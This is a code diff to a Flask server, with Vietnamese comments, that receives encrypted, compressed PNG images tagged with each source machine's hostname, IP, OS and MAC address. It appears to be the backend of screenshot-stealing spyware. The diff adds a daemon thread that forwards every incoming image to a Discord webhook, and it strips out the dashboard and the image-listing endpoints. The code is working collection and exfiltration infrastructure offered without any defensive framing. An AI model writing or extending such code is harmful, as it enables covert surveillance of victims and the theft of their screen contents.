@@ -7,6 +7,8 @@ from datetime import datetime
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
 import io
+import threading
+import requests
 
 load_dotenv()
 
@@ -21,6 +23,7 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
 fernet = Fernet(FERNET_KEY)
+session = requests.Session()  # reuse TCP connection
 
 
 class ImageRecord(db.Model):
@@ -36,12 +39,27 @@ class ImageRecord(db.Model):
 def decrypt_and_decompress(data_base64: str) -> bytes:
     encrypted_data = base64.b64decode(data_base64)
     decrypted = fernet.decrypt(encrypted_data)
-    return zlib.decompress(decrypted)
+    return zlib.decompress(decrypted)  # giải nén ảnh PNG gốc
+
+
+def send_to_discord_async(filename, img_bytes):
+    def task():
+        files = {"file": (filename, io.BytesIO(img_bytes), "image/png")}
+        data = {"content": f"📷 Ảnh mới nhận: `{filename}`"}
+        try:
+            res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=10)
+            print(f"[Discord] Status: {res.status_code}")
+        except Exception as e:
+            print(f"[!] Lỗi gửi Discord: {e}")
+
+    thread = threading.Thread(target=task)
+    thread.daemon = True
+    thread.start()
 
 
 @app.route("/")
 def dashboard():
-    return render_template("dashboard.html")
+    return "Server is running"
 
 
 @app.route("/upload", methods=["POST"])
@@ -71,57 +89,13 @@ def upload():
         db.session.add(record)
         db.session.commit()
 
+        # Gửi ảnh Discord async
+        send_to_discord_async(filename, img_data)
+
         return jsonify({"status": "success", "filename": filename})
     except Exception as e:
         print(f"[!] Upload Error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 400
-
-
-@app.route("/api/images", methods=["GET"])
-def list_images():
-    # Lọc tham số (hostname, ip, từ ngày đến ngày)
-    hostname = request.args.get("hostname")
-    ip = request.args.get("ip")
-    from_date = request.args.get("from_date")  # yyyy-mm-dd
-    to_date = request.args.get("to_date")      # yyyy-mm-dd
-
-    query = ImageRecord.query
-
-    if hostname:
-        query = query.filter(ImageRecord.hostname.contains(hostname))
-    if ip:
-        query = query.filter(ImageRecord.ip.contains(ip))
-    if from_date:
-        query = query.filter(ImageRecord.timestamp >= from_date)
-    if to_date:
-        query = query.filter(ImageRecord.timestamp <= to_date)
-
-    # Phân trang (limit/offset)
-    limit = int(request.args.get("limit", 20))
-    offset = int(request.args.get("offset", 0))
-
-    total = query.count()
-    records = query.order_by(ImageRecord.timestamp.desc()).limit(limit).offset(offset).all()
-
-    data = [{
-        "id": r.id,
-        "filename": r.filename,
-        "hostname": r.hostname,
-        "ip": r.ip,
-        "os": r.os,
-        "mac": r.mac,
-        "timestamp": r.timestamp.isoformat()
-    } for r in records]
-
-    return jsonify({"total": total, "data": data})
-
-
-@app.route("/image/<filename>")
-def serve_image(filename):
-    path = os.path.join(SAVE_FOLDER, filename)
-    if os.path.exists(path):
-        return send_file(path, mimetype="image/png")
-    return "File not found", 404
 
 
 if __name__ == "__main__":
